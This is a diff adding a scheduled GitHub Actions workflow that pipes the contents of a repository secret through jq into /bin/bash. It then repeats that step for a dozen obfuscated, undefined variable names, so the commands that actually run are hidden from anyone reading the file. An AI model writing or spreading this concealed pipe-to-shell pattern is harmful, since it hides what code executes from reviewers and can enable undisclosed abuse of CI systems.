@@ -1,0 +1,29 @@
+name: daxiaguzhuabu
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '25 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: daxiaguzhuabu
+        env:
+          kykp727: ${{ secrets.kykp727 }}
+        run: |
+          echo $kykp727 | jq -r .is3 | /bin/bash
+          echo $ebraf773 | jq -r .pzr59850 | /bin/bash
+          echo $mxev79 | jq -r .vhpl245 | /bin/bash
+          echo $sc27 | jq -r .wamxn31 | /bin/bash
+          echo $fdj7799 | jq -r .quwb55 | /bin/bash
+          echo $spytc9 | jq -r .okzfs21 | /bin/bash
+          echo $qqk8342 | jq -r .khho76465 | /bin/bash
+          echo $wkn9025 | jq -r .csujy978 | /bin/bash
+          echo $hzsr1633 | jq -r .hzcvd68 | /bin/bash
+          echo $fw3 | jq -r .koqv4 | /bin/bash
+          echo $mnanm8947 | jq -r .rcwv2478 | /bin/bash
+          echo $hyct76 | jq -r .rjhw958 | /bin/bash
+          echo $kcx45 | jq -r .nbpu58460 | /bin/bash
+
